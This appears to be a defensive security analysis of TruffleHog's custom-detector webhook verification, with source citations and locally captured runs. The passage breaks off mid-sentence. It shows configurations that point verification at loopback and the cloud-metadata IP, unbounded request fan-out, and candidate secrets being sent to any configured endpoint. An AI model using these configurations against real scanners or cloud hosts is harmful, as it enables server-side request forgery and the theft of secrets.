# TruffleHog Custom-Detector Webhook Verification — Security Analysis

**Can untrusted teams safely contribute custom detector configurations to TruffleHog?**

This document answers, with evidence, a set of concrete security questions about the **custom
detector webhook verification** path in TruffleHog, framed for an operator who must decide whether
detector YAML configurations supplied by **untrusted teams** can be treated as safe input.

| Property | Value |
|---|---|
| Subject | Security of the custom-detector *webhook verification* path when detector YAML configs are **untrusted input** |
| Pinned commit | `e42153d44a5e5c37c1bd0c70e074781e9edcb760` (branch `trufflehog_e42153d44a5e`) |
| Go toolchain used | `go1.24.2` (the highest explicitly documented toolchain; `go.mod` declares `go 1.23.1` with `toolchain go1.24.2` `[go.mod:L3-L5]`) |
| Module | `github.com/trufflesecurity/trufflehog/v3` `[go.mod:L1]` |
| Methodology | **Evidence over theory** — every answer is backed by *both* (a) an inline source citation in the form `[<repo-relative-path>:L<line>]` (e.g., `[pkg/custom_detectors/validation.go:L35-L44]`; the code is the source of truth) *and* (b) reproduced runtime output captured by building and running TruffleHog. |

> **The operator's overarching question:** *"What I'm really trying to determine is whether someone
> with control over a detector configuration could abuse the verification system in ways we haven't
> anticipated."* Section 3 answers this directly; Sections 1–2 build the evidence.

> **Scope and integrity note.** This is a read-only investigation. No TruffleHog source file was
> modified, and no code was added to the repository other than this document. All test scaffolding
> (a built binary, YAML configs, HTTP/HTTPS listeners, a self-signed certificate, and target
> fixtures) was created **outside** the repository tree under `/tmp/th_harness/` and deleted after
> evidence capture. See Section 5.

---

## Section 1 — Introduction and Threat-Model Framing

### 1.1 The question being answered

TruffleHog lets an operator define **custom detectors** in a YAML configuration file. Each detector
declares keywords, one or more named regular expressions, and an optional `verify` block that names
an HTTP(S) **endpoint**. When a detector matches, TruffleHog can issue an outbound HTTP request to
that endpoint to decide whether the matched candidate is a live ("verified") secret.

If the people who *write those configurations* are not fully trusted, then the `endpoint`, the
`headers`, and the `regex` fields are all **attacker-influenced input** that the scanner will act on.
This document evaluates five concrete exposure surfaces (SSRF, TLS/MITM, request amplification,
data egress, and ReDoS) and then renders a consolidated verdict.

### 1.2 How a configuration becomes a live verifier (the load path)

The configuration is read and converted into detector objects before any scanning begins:

- `config.Read(filename)` reads the file `[pkg/config/config.go:L18-L24]` and calls `NewYAML`.
- `NewYAML` parses the bytes **strictly** into a protobuf message:
  `protoyaml.UnmarshalStrict(input, &messages)` where `messages` is a
  `custom_detectorspb.CustomDetectors` `[pkg/config/config.go:L29-L30]`.
- For every entry it constructs one detector via
  `custom_detectors.NewWebhookCustomRegex(detectorConfig)` `[pkg/config/config.go:L36]`.

The configuration schema is defined in `proto/custom_detectors.proto`: the top-level
`CustomDetectors` message `[proto/custom_detectors.proto:L9-L11]`, the per-detector `CustomRegex`
message `[proto/custom_detectors.proto:L13-L23]`, and the verifier block `VerifierConfig`
`[proto/custom_detectors.proto:L26-L31]`. The `endpoint` field carries a single protobuf-validate
rule — `(validate.rules).string.uri_ref = true` `[proto/custom_detectors.proto:L27]` — which is a
**URI *format* rule only**; it does not constrain the host, IP, or network range.

`NewWebhookCustomRegex` is the single validation gate `[pkg/custom_detectors/custom_detectors.go:L40-L60]`.
It calls, in order, `ValidateKeywords`, `ValidateRegex` `[pkg/custom_detectors/custom_detectors.go:L45]`, then for each verify block
`ValidateVerifyEndpoint` `[pkg/custom_detectors/custom_detectors.go:L50]` and `ValidateVerifyHeaders` `[pkg/custom_detectors/custom_detectors.go:L53]`. Notably, two other validators
that exist in the package — `ValidateVerifyRanges` `[pkg/custom_detectors/validation.go:L55-L97]` and
`ValidateRegexVars` `[pkg/custom_detectors/validation.go:L99-L109]` — are **defined but never invoked**
on this initialization path.

### 1.3 The CLI vehicle used for all demonstrations

Every demonstration below uses the `filesystem` subcommand `[main.go:L143-L144]` with two flags:
`--config` `[main.go:L70]` (which is read by `config.Read(*configFilename)` `[main.go:L463]`) and
`--custom-verifiers-only` `[main.go:L76]` (wired into the engine as `CustomVerifiersOnly`
`[main.go:L523]`, consumed at `[pkg/engine/engine.go:L293]`). The end-of-scan summary counters
`verified_secrets` / `unverified_secrets` come from the `"finished scanning"` log line
`[main.go:L566-L574]`.

### 1.4 Verification flow (summary diagram)

```mermaid
flowchart TD
    A["YAML config loaded<br/>config.Read — pkg/config/config.go:L18"] --> B["NewWebhookCustomRegex<br/>validation wiring<br/>pkg/custom_detectors/custom_detectors.go:L40-L60"]
    B --> C["ValidateVerifyEndpoint<br/>pkg/custom_detectors/validation.go:L35-L44<br/>NON-EMPTY + http-scheme check ONLY"]
    C --> D["Scan chunk -> regex matches + filters<br/>entropy / exclude-words / exclude-regexes<br/>pkg/custom_detectors/custom_detectors.go:L117-L153"]
    D --> E["Permute matches<br/>cap maxTotalMatches = 100<br/>pkg/custom_detectors/custom_detectors.go:L23,L295-L297"]
    E --> F["errgroup dispatch — one g.Go per match<br/>NO SetLimit (unbounded concurrency)<br/>pkg/custom_detectors/custom_detectors.go:L112,L155-L157"]
    F --> G["createResults: build JSON body<br/>{Name:{group:[match]}}<br/>pkg/custom_detectors/custom_detectors.go:L214-L216"]
    G --> H["POST via SaneHttpClient<br/>to RAW user endpoint<br/>pkg/custom_detectors/custom_detectors.go:L228"]
    H --> I{"HTTP 200?"}
    I -->|"yes"| J["result.Verified = true; break<br/>pkg/custom_detectors/custom_detectors.go:L249,L251,L268"]
    I -->|"no / transport error"| K["Unverified"]
```

The critical observation visible in this flow is that the user-supplied `endpoint` flows
**unfiltered** from configuration load all the way to `http.NewRequestWithContext(... "POST",
verifyConfig.GetEndpoint() ...)` `[pkg/custom_detectors/custom_detectors.go:L228]`. The only gate it
passes through, `ValidateVerifyEndpoint` `[pkg/custom_detectors/validation.go:L35-L44]`, inspects the
string scheme but never the destination.

---

## Section 2 — Per-Question Analysis

Each question is presented in six parts: **(a)** the verbatim question, **(b)** the cited code-path
walkthrough, **(c)** the reproducible commands, **(d)** the captured runtime output, **(e)** the
reasoning, and **(f)** a one-line verdict. Runtime output was captured against a local Python
listener; the harness is documented in full in Section 5.

### Q1 — Server-Side Request Forgery (SSRF)

**(a) Question (verbatim):**

> "If someone submits a detector configuration pointing to an internal address or a cloud metadata endpoint, what actually happens? I assumed there would be validation preventing this, but I haven't been able to confirm that from the documentation."

**(b) Code-path walkthrough.**

The only endpoint validation is `ValidateVerifyEndpoint(endpoint, unsafe)`
`[pkg/custom_detectors/validation.go:L35-L44]`. It performs exactly two checks and nothing else:

```go
func ValidateVerifyEndpoint(endpoint string, unsafe bool) error {
	if len(endpoint) == 0 {
		return fmt.Errorf("no endpoint")                       // (a) non-empty           [pkg/custom_detectors/validation.go:L36-L38]
	}
	if strings.HasPrefix(endpoint, "http://") && !unsafe {
		return fmt.Errorf("http endpoint must have unsafe=true") // (b) http:// needs unsafe [pkg/custom_detectors/validation.go:L40-L42]
	}
	return nil
}
```

There is **no** host parse, **no** IP resolution, **no** private-range / loopback / link-local
check, and **no** metadata-endpoint denial. The candidate endpoint is then used verbatim to build
the request: `http.NewRequestWithContext(ctx, "POST", verifyConfig.GetEndpoint(),
bytes.NewReader(jsonBody))` `[pkg/custom_detectors/custom_detectors.go:L228]`.

The HTTP client is `common.SaneHttpClient()` `[pkg/custom_detectors/custom_detectors.go:L62]`. That
client is a bare `&http.Client{}` with a 5-second timeout and the `saneTransport` round-tripper
`[pkg/common/http.go:L223-L228]`; `saneTransport` uses `Proxy: http.ProxyFromEnvironment` and a
plain `net.Dialer` with **no IP-block / dial-control hook** `[pkg/common/http.go:L211-L221]`. Because
the client literal sets **no `CheckRedirect`** policy `[pkg/common/http.go:L223-L228]`, Go's default
applies and **redirects are followed**, which compounds the exposure (an allowed-looking endpoint can
302-redirect to an internal target; DNS rebinding is likewise unmitigated).

A crucial corroborating detail: TruffleHog *does* ship SSRF-hardening machinery — but the
custom-detector path does not use it. `pkg/detectors/http.go` defines
`DetectorHttpClientWithNoLocalAddresses` `[pkg/detectors/http.go:L14-L15,L33-L38]`, built with
`WithNoLocalIP()` `[pkg/detectors/http.go:L106-L151]`, whose dialer resolves the host and refuses to
connect when any resolved IP `isLocalIP` (loopback / link-local / private)
`[pkg/detectors/http.go:L96-L102]`, and `WithNoFollowRedirects()` `[pkg/detectors/http.go:L59-L65]`.
That protected client is simply **not** the one custom detectors use. The protobuf
`uri_ref = true` rule `[proto/custom_detectors.proto:L27]` is a format rule and provides no host
filtering.

**(c) Reproducible commands.**

Both demonstrations use `cfg_q1a_loopback.yaml` and `cfg_q1b_metadata.yaml` (full contents in §5.2.4),
the `target_single.txt` fixture (§5.2.5), and the listener/proxy scripts from §5.2.1 / §5.2.3.

*Q1a — internal/loopback target with a cloud-metadata-style path* (endpoint
`http://127.0.0.1:18099/latest/meta-data/iam/security-credentials/`, `unsafe: true`):

```bash
# Terminal 1: a listener that logs each request and returns HTTP 200
python3 /tmp/th_harness/listener_http.py 18099
# Terminal 2:
/tmp/th_harness/trufflehog filesystem /tmp/th_harness/target_single.txt \
  --config=/tmp/th_harness/cfg_q1a_loopback.yaml --custom-verifiers-only --no-update
```

*Q1b — the AWS metadata IP `169.254.169.254`* (endpoint
`https://169.254.169.254/latest/meta-data/iam/security-credentials/`; no `unsafe` needed because the
scheme is `https`). To capture **direct proof of the outbound connection attempt** without a routable
metadata IP in the sandbox, the verification request is routed through the logging CONNECT proxy
(§5.2.3) via `HTTPS_PROXY`. This works because `saneTransport` honors `http.ProxyFromEnvironment`
`[pkg/common/http.go:L211-L221]`, and `169.254.169.254` is link-local (not loopback), so Go routes it
through the proxy rather than bypassing it:

```bash
# Terminal 1: a proxy that logs the CONNECT target and refuses the tunnel (502)
python3 /tmp/th_harness/connect_proxy.py 18080
# Terminal 2:
HTTPS_PROXY=http://127.0.0.1:18080 https_proxy=http://127.0.0.1:18080 NO_PROXY="" no_proxy="" \
  /tmp/th_harness/trufflehog filesystem /tmp/th_harness/target_single.txt \
  --config=/tmp/th_harness/cfg_q1b_metadata.yaml --custom-verifiers-only --no-update
```

**(d) Captured runtime output.**

*Q1a* — TruffleHog verified the match by POSTing to the loopback metadata-style path. Full TruffleHog
output (verbatim):

```text
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2026-06-26T22:21:52Z	info-0	trufflehog	running source	{"source_manager_worker_id": "tGygn", "with_units": true}
✅ Found verified result 🐷🔑
Detector Type: CustomRegex
Decoder Type: PLAIN
Raw result: HOGCCCCCCCCCCCCCCCCC
Response: {"status":"ok"}
Name: HogTokenDetector
File: /tmp/th_harness/target_single.txt
Line: 2

2026-06-26T22:21:52Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 25, "verified_secrets": 1, "unverified_secrets": 0, "scan_duration": "4.979313ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":1}}
```

The listener received the request (verbatim log) — note the loopback metadata-style path, the
`User-Agent: TruffleHog`, and the candidate secret in the body:

```text
HTTP listener on 127.0.0.1:18099
==== REQUEST @ 22:21:52.177227 ====
REQUEST-LINE: POST /latest/meta-data/iam/security-credentials/ HTTP/1.1
HEADER: Host: 127.0.0.1:18099
HEADER: User-Agent: TruffleHog
HEADER: Content-Length: 55
HEADER: Accept-Encoding: gzip
BODY: {"HogTokenDetector":{"hogID":["HOGCCCCCCCCCCCCCCCCC"]}}
==== END @ 22:21:52.177268 ====
```

*Q1b* — the `169.254.169.254` configuration was **accepted with no validation error**, and TruffleHog
**attempted an outbound connection to the metadata IP**. Full TruffleHog output (verbatim):

```text
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2026-06-26T22:22:07Z	info-0	trufflehog	running source	{"source_manager_worker_id": "2Qgac", "with_units": true}
Found unverified result 🐷🔑❓
Detector Type: CustomRegex
Decoder Type: PLAIN
Raw result: HOGCCCCCCCCCCCCCCCCC
Name: HogTokenDetector
File: /tmp/th_harness/target_single.txt
Line: 2

2026-06-26T22:22:07Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 25, "verified_secrets": 0, "unverified_secrets": 1, "scan_duration": "4.983745ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":0}}
```

**Direct proof of the outbound attempt** — the logging CONNECT proxy captured TruffleHog trying to
open a tunnel to `169.254.169.254:443` (verbatim proxy log). The result is `unverified` *only* because
the proxy refused the tunnel (502), not because of any destination guard in TruffleHog:

```text
CONNECT proxy on 127.0.0.1:18080
==== PROXY REQUEST @ 22:22:07.479833 ====
REQUEST-LINE: CONNECT 169.254.169.254:443 HTTP/1.1
CONNECT-TARGET: 169.254.169.254:443
PROXY-ACTION: refused tunnel with 502 (attempt captured)
==== END @ 22:22:07.479875 ====
```

This `CONNECT 169.254.169.254:443` line is the empirical proof requested: the scanner did not merely
*accept* the metadata-IP configuration, it actively *tried to reach* the metadata IP on the network.

**(e) Reasoning.**

The endpoint is attacker-influenced input that reaches an outbound `POST` with no destination
validation: `ValidateVerifyEndpoint` enforces only "non-empty" and "http scheme ⇒ `unsafe=true`"
`[pkg/custom_detectors/validation.go:L35-L44]`, and the request targets `GetEndpoint()` directly
`[pkg/custom_detectors/custom_detectors.go:L228]` over a client with no IP-block hook and default
redirect-following `[pkg/common/http.go:L211-L228]`. The Q1a evidence shows the scanner can be made
to issue a request to a loopback metadata-style path; the Q1b evidence shows the scanner actively
**attempted a network connection to the metadata IP** `169.254.169.254:443` (captured as a `CONNECT`
by the egress proxy) — config acceptance and a demonstrated outbound attempt, not merely a parse that
succeeded. This is the canonical webhook-SSRF "confused deputy": the trust and
network position belong to the *scanner*, while the destination is chosen by the *config author*.
That TruffleHog already contains an IP-blocking client it chose not to wire in here
`[pkg/detectors/http.go:L96-L151]` underscores that this is a gap on the custom-detector path, not a
platform-wide limitation.

**(f) Verdict.** **SSRF is possible.** The verification subsystem performs no destination validation
on the user-controlled `endpoint`; loopback/internal targets and the cloud-metadata IP are accepted
and requested, and redirects are followed by default.

---

### Q2 — TLS Certificate Validation and Man-in-the-Middle

**(a) Question (verbatim):**

> "When verification requests are made over HTTPS, what certificate validation does TruffleHog perform? If someone is sitting on the network path, could they intercept the traffic?"

**(b) Code-path walkthrough.**

Custom-detector verification uses `common.SaneHttpClient()`
`[pkg/custom_detectors/custom_detectors.go:L62]`. That factory returns an `&http.Client{}` whose
transport is `NewCustomTransport(saneTransport)` `[pkg/common/http.go:L223-L228]`:

```go
func SaneHttpClient() *http.Client {
	httpClient := &http.Client{}
	httpClient.Timeout = DefaultResponseTimeout            // 5s  [pkg/common/http.go:L209,L225]
	httpClient.Transport = NewCustomTransport(saneTransport)
	return httpClient
}
```

`saneTransport` sets a proxy and dialer but **no `TLSClientConfig`** at all
`[pkg/common/http.go:L211-L221]`. When `TLSClientConfig` is nil, Go's `net/http`/`crypto/tls` applies
its secure defaults — full certificate-chain verification and hostname matching — because the
`crypto/tls` field `InsecureSkipVerify` defaults to `false`. The `CustomTransport.RoundTrip` wrapper
adds only a `User-Agent` header and otherwise delegates to the underlying transport
`[pkg/common/http.go:L99-L102]`; it does not touch TLS.

A repository search confirms the negative: `InsecureSkipVerify` appears **nowhere** in
`pkg/common` or `pkg/custom_detectors`:

```bash
grep -rn "InsecureSkipVerify" pkg/common pkg/custom_detectors   # -> no matches (exit 1)
```

The one client that *does* set a `TLSClientConfig` — `PinnedRetryableHttpClient`, which pins to a CA
pool `[pkg/common/http.go:L159-L178]` — is *not* used by custom detectors. Finally, the `unsafe`
flag is **not** a TLS switch: it relaxes only the `http://` scheme gate
`[pkg/custom_detectors/validation.go:L40-L42]` and never reaches `crypto/tls`.

**(c) Reproducible commands.**

Serve HTTPS with the self-signed (untrusted) certificate from §5.2.2 and point a detector at it
(`cfg_q2_selfsigned.yaml`, endpoint `https://localhost:18443/verify`; full config in §5.2.4):

```bash
# Terminal 1: HTTPS listener with the self-signed cert/key generated in §5.2.2
python3 /tmp/th_harness/listener_https.py 18443 /tmp/th_harness/cert.pem /tmp/th_harness/key.pem
# Terminal 2 — first, confirm the cert is genuinely untrusted yet the server is reachable:
curl -sS -o /dev/null -w "http_code=%{http_code}\n" https://localhost:18443/verify   # default verify
curl -sS -k -w "\nhttp_code=%{http_code}\n" https://localhost:18443/verify           # -k bypasses verify
# then run TruffleHog against the self-signed endpoint:
/tmp/th_harness/trufflehog filesystem /tmp/th_harness/target_single.txt \
  --config=/tmp/th_harness/cfg_q2_selfsigned.yaml --custom-verifiers-only --no-update
```

Also demonstrate the load-time scheme gate with `cfg_q2_http_no_unsafe.yaml` (endpoint
`http://127.0.0.1:18099/verify`, **no** `unsafe`; full config in §5.2.4):

```bash
/tmp/th_harness/trufflehog filesystem /tmp/th_harness/target_single.txt \
  --config=/tmp/th_harness/cfg_q2_http_no_unsafe.yaml --custom-verifiers-only --no-update
```

**(d) Captured runtime output.**

First, proof the certificate is genuinely untrusted (so a default client *should* reject it) yet the
server is reachable when verification is bypassed (verbatim):

```text
$ curl -sS -o /dev/null -w "http_code=%{http_code}\n" https://localhost:18443/verify   # default verify
curl: (60) SSL certificate problem: self-signed certificate
More details here: https://curl.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the webpage mentioned above.
http_code=000
$ echo $?
60
$ curl -sS -k -w "\nhttp_code=%{http_code}\n" https://localhost:18443/verify           # -k bypasses verify
{"status":"ok"}
http_code=200
$ echo $?
0
```

TruffleHog against that endpoint returns **unverified**. Full TruffleHog output (verbatim):

```text
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2026-06-26T22:22:24Z	info-0	trufflehog	running source	{"source_manager_worker_id": "ICJ60", "with_units": true}
Found unverified result 🐷🔑❓
Detector Type: CustomRegex
Decoder Type: PLAIN
Raw result: HOGCCCCCCCCCCCCCCCCC
Name: HogTokenDetector
File: /tmp/th_harness/target_single.txt
Line: 2

2026-06-26T22:22:24Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 25, "verified_secrets": 0, "unverified_secrets": 1, "scan_duration": "13.464119ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":9}}
```

Decisively, the HTTPS listener for the TruffleHog run logged **only its startup line — no `REQUEST`
line was ever recorded** (the handshake was rejected before any body was sent). Full listener log:

```text
HTTPS listener on 127.0.0.1:18443 (self-signed cert)
```

The `http://`-without-`unsafe` configuration is rejected at **load time** (verbatim — no scan occurs):

```text
2026-06-26T22:22:35Z	error	trufflehog	error parsing the provided configuration file	{"error": "http endpoint must have unsafe=true"}
```

**(e) Reasoning.**

Because the verification client inherits Go's default TLS behavior (`InsecureSkipVerify == false`,
full chain + hostname verification) and nothing on the custom-detector path overrides it
`[pkg/common/http.go:L211-L228]`, an HTTPS verification request to an endpoint presenting an
untrusted certificate **fails closed**: the TLS handshake aborts and the request body never leaves
the process — exactly what the empty HTTPS listener log demonstrates. A network attacker who can
intercept packets but cannot present a certificate that chains to a trusted CA therefore cannot read
or alter the verification traffic. The only weakening is operator-chosen and explicit: setting
`unsafe: true` together with an `http://` endpoint sends the request (and the candidate secret — see
Q4) in cleartext; that is a deliberate configuration choice, gated and surfaced at load time, not a
silent default.

**(f) Verdict.** **HTTPS verification is safe by default and fails closed.** A MITM presenting an
untrusted certificate cannot intercept the traffic; the only cleartext exposure is the operator's own
`unsafe: true` + `http://` choice.

---

### Q3 — Verification Amplification (multiple matches in one file)

**(a) Question (verbatim):**

> "There's also something I don't fully understand about how verification works when a detector has multiple matching patterns in the same file. Does it verify once, or does something more complex happen? If it's more complex, is there any limit on how many requests can be triggered?"

**(b) Code-path walkthrough.**

Verification is **per match**, not once per detector. `FromData` collects every regex submatch
`[pkg/custom_detectors/custom_detectors.go:L91-L98]`, then expands them into one entry per
combination via `permutateMatches` `[pkg/custom_detectors/custom_detectors.go:L110]`. The number of
permutations is capped at `maxTotalMatches = 100` `[pkg/custom_detectors/custom_detectors.go:L23]`
inside `productIndices`:

```go
if count > maxTotalMatches {        // [pkg/custom_detectors/custom_detectors.go:L295-L297]
	count = maxTotalMatches
}
```

The results channel is buffered to the same bound `[pkg/custom_detectors/custom_detectors.go:L115]`.
Dispatch, however, is where the amplification lives. An `errgroup.Group` is created with **no
concurrency limit** — there is no `g.SetLimit(...)` call anywhere
`[pkg/custom_detectors/custom_detectors.go:L112]` — and one goroutine is launched per surviving match:

```go
g := new(errgroup.Group)            // [pkg/custom_detectors/custom_detectors.go:L112]  (no SetLimit)
...
g.Go(func() error {                 // [pkg/custom_detectors/custom_detectors.go:L155-L157]  one per match
	return c.createResults(ctx, match, verify, resultsCh)
})
```

Each `createResults` call then issues **one POST per configured verify endpoint per match**: it
loops over `c.GetVerify()` `[pkg/custom_detectors/custom_detectors.go:L223]`, builds a request
`[pkg/custom_detectors/custom_detectors.go:L228]`, and on the first HTTP 200 sets `result.Verified = true` `[pkg/custom_detectors/custom_detectors.go:L251]` and `break`s `[pkg/custom_detectors/custom_detectors.go:L268]`.
So the outbound request count for one qualifying chunk is approximately
**min(matches, 100) × N endpoints**, dispatched concurrently with no ceiling.

**(c) Reproducible commands.**

A single fixture (`target_multi.txt`, §5.2.5) with three matching tokens in one chunk, scanned against
`cfg_q3_multi.yaml` (endpoint `http://127.0.0.1:18099/verify`, `unsafe: true`; full config in §5.2.4).
The fixture contents are:

```text
hog tokens for amplification test
HOGAAAAAAAAAAAAAAAAA
HOGBBBBBBBBBBBBBBBBB
HOGCCCCCCCCCCCCCCCCC
```

```bash
# Terminal 1: threaded listener; logs each request with a microsecond timestamp
python3 /tmp/th_harness/listener_http.py 18099
# Terminal 2:
/tmp/th_harness/trufflehog filesystem /tmp/th_harness/target_multi.txt \
  --config=/tmp/th_harness/cfg_q3_multi.yaml --custom-verifiers-only --no-update
```

**(d) Captured runtime output.**

TruffleHog reports three verified secrets from the one chunk. Full TruffleHog output (verbatim):

```text
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2026-06-26T22:22:47Z	info-0	trufflehog	running source	{"source_manager_worker_id": "Bsxdx", "with_units": true}
✅ Found verified result 🐷🔑
Detector Type: CustomRegex
Decoder Type: PLAIN
Raw result: HOGCCCCCCCCCCCCCCCCC
Response: {"status":"ok"}
Name: HogTokenDetector
File: /tmp/th_harness/target_multi.txt
Line: 4

✅ Found verified result 🐷🔑
Detector Type: CustomRegex
Decoder Type: PLAIN
Raw result: HOGAAAAAAAAAAAAAAAAA
Name: HogTokenDetector
Response: {"status":"ok"}
File: /tmp/th_harness/target_multi.txt
Line: 2

✅ Found verified result 🐷🔑
Detector Type: CustomRegex
Decoder Type: PLAIN
Raw result: HOGBBBBBBBBBBBBBBBBB
Response: {"status":"ok"}
Name: HogTokenDetector
File: /tmp/th_harness/target_multi.txt
Line: 3

2026-06-26T22:22:47Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 97, "verified_secrets": 3, "unverified_secrets": 0, "scan_duration": "6.485829ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":1}}
```

The threaded listener received **three** separate `POST /verify` requests with near-simultaneous
microsecond timestamps (start times `.349555`, `.350206`, `.350431` — a span of ~0.9 ms), one per
match — direct evidence of concurrent dispatch. Full listener log (verbatim):

```text
HTTP listener on 127.0.0.1:18099
==== REQUEST @ 22:22:47.349555 ====
REQUEST-LINE: POST /verify HTTP/1.1
HEADER: Host: 127.0.0.1:18099
HEADER: User-Agent: TruffleHog
HEADER: Content-Length: 55
HEADER: Accept-Encoding: gzip
BODY: {"HogTokenDetector":{"hogID":["HOGAAAAAAAAAAAAAAAAA"]}}
==== END @ 22:22:47.349599 ====
==== REQUEST @ 22:22:47.350206 ====
REQUEST-LINE: POST /verify HTTP/1.1
HEADER: Host: 127.0.0.1:18099
HEADER: User-Agent: TruffleHog
HEADER: Content-Length: 55
HEADER: Accept-Encoding: gzip
BODY: {"HogTokenDetector":{"hogID":["HOGCCCCCCCCCCCCCCCCC"]}}
==== END @ 22:22:47.350237 ====
==== REQUEST @ 22:22:47.350431 ====
REQUEST-LINE: POST /verify HTTP/1.1
HEADER: Host: 127.0.0.1:18099
HEADER: User-Agent: TruffleHog
HEADER: Content-Length: 55
HEADER: Accept-Encoding: gzip
BODY: {"HogTokenDetector":{"hogID":["HOGBBBBBBBBBBBBBBBBB"]}}
==== END @ 22:22:47.350452 ====
```

**(e) Reasoning.**

Three matches produced three POSTs, confirming the relationship is one outbound request per match
(per endpoint), not a single per-detector call. The match count is bounded — `maxTotalMatches = 100`
caps permutations `[pkg/custom_detectors/custom_detectors.go:L23,L295-L297]` and the results channel
is sized to match `[pkg/custom_detectors/custom_detectors.go:L115]` — but the *concurrency* of those
requests is **not** bounded, because the `errgroup` is created without `SetLimit`
`[pkg/custom_detectors/custom_detectors.go:L112]`. The ~0.9 ms spread across the three request start
timestamps shows the requests fire effectively in parallel. Scaling this up: a single
crafted chunk that yields the maximum 100 permutations against a config with N verify endpoints can
trigger on the order of 100 × N simultaneous outbound POSTs from one chunk. Combined with the Q1 SSRF
finding (the operator does not control the destination), this fan-out is also an amplification
primitive an attacker could aim at a third party.

**(f) Verdict.** **Verification is per-match, not once-per-detector.** Matches per chunk are capped at
100, but outbound concurrency is unbounded (`errgroup` with no `SetLimit`), so one chunk can fan out
to roughly 100 × (number of endpoints) concurrent requests.

---

### Q4 — Data Exposure (what is sent to the endpoint)

**(a) Question (verbatim):**

> "When the verification webhook is called, what data gets sent to the endpoint? I need to understand what information is included in the request."

**(b) Code-path walkthrough.**

The request body is built by marshalling the matched values into JSON
`[pkg/custom_detectors/custom_detectors.go:L214-L216]`:

```go
jsonBody, err := json.Marshal(map[string]map[string][]string{
	c.GetName(): match,                                  // {"<DetectorName>": {"<regexGroup>": [match...]}}
})
```

The `match` map's values are the regex submatches — i.e., the **candidate secret material** itself.
The HTTP method is **POST** and the body is sent as the request payload
`[pkg/custom_detectors/custom_detectors.go:L228]`. Operator-defined headers are attached verbatim:
each configured header string is split on the first colon via `strings.Cut`, and the value is added
after trimming leading whitespace `[pkg/custom_detectors/custom_detectors.go:L232-L239]`:

```go
for _, header := range verifyConfig.GetHeaders() {
	key, value, found := strings.Cut(header, ":")
	if !found { continue }
	req.Header.Add(key, strings.TrimLeft(value, "\t\n\v\f\r "))   // [pkg/custom_detectors/custom_detectors.go:L232-L239]
}
```

Finally, `CustomTransport.RoundTrip` adds a `User-Agent: TruffleHog` header
`[pkg/common/http.go:L99-L102]` (the value from `UserAgent()` `[pkg/common/http.go:L96-L97]`). The
documented body shape and the "respond 200 ⇒ verified" contract match the sample verification
servers in `pkg/custom_detectors/CUSTOM_DETECTORS.md` `[pkg/custom_detectors/CUSTOM_DETECTORS.md:L100-L209]`.

**(c) Reproducible commands.**

Scan `target_single.txt` (§5.2.5) against `cfg_q4_headers.yaml` (full config in §5.2.4), whose verify
block adds two operator headers (placeholder values — never put a real secret in a config you don't
fully control):

```yaml
  verify:
  - endpoint: http://127.0.0.1:18099/verify
    unsafe: true
    headers:
    - "Authorization: Bearer demo-not-a-real-secret-PLACEHOLDER"
    - "X-Custom-Token: static-token-PLACEHOLDER-value"
```

```bash
# Terminal 1:
python3 /tmp/th_harness/listener_http.py 18099
# Terminal 2:
/tmp/th_harness/trufflehog filesystem /tmp/th_harness/target_single.txt \
  --config=/tmp/th_harness/cfg_q4_headers.yaml --custom-verifiers-only --no-update
```

**(d) Captured runtime output.**

The listener captured the full request — method, path, the `User-Agent: TruffleHog` header, **both
operator headers verbatim**, and a body containing the **candidate secret value**. Full listener log
(verbatim):

```text
HTTP listener on 127.0.0.1:18099
==== REQUEST @ 22:22:59.103569 ====
REQUEST-LINE: POST /verify HTTP/1.1
HEADER: Host: 127.0.0.1:18099
HEADER: User-Agent: TruffleHog
HEADER: Content-Length: 55
HEADER: Authorization: Bearer demo-not-a-real-secret-PLACEHOLDER
HEADER: X-Custom-Token: static-token-PLACEHOLDER-value
HEADER: Accept-Encoding: gzip
BODY: {"HogTokenDetector":{"hogID":["HOGCCCCCCCCCCCCCCCCC"]}}
==== END @ 22:22:59.103620 ====
```

Full TruffleHog output (verbatim):

```text
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2026-06-26T22:22:59Z	info-0	trufflehog	running source	{"source_manager_worker_id": "SO24k", "with_units": true}
✅ Found verified result 🐷🔑
Detector Type: CustomRegex
Decoder Type: PLAIN
Raw result: HOGCCCCCCCCCCCCCCCCC
Name: HogTokenDetector
Response: {"status":"ok"}
File: /tmp/th_harness/target_single.txt
Line: 2

2026-06-26T22:22:59Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 25, "verified_secrets": 1, "unverified_secrets": 0, "scan_duration": "5.0019ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":1}}
```

**(e) Reasoning.**

The captured body `{"HogTokenDetector":{"hogID":["HOGCCCCCCCCCCCCCCCCC"]}}` is exactly the
`{Name:{group:[match]}}` structure produced at `[pkg/custom_detectors/custom_detectors.go:L214-L216]`,
and `HOGCCCCCCCCCCCCCCCCC` is the candidate secret the detector matched in the file. So the matched
value **leaves the process** and is delivered to whatever destination the configuration names. The two
operator headers arrived byte-for-byte, confirming that any static credential placed in `headers`
`[pkg/custom_detectors/custom_detectors.go:L232-L239]` is transmitted to that same destination.
Connecting this to Q1: because the destination is unvalidated (SSRF), a malicious configuration can
direct both the candidate secret and any header credentials to an attacker-controlled endpoint — i.e.,
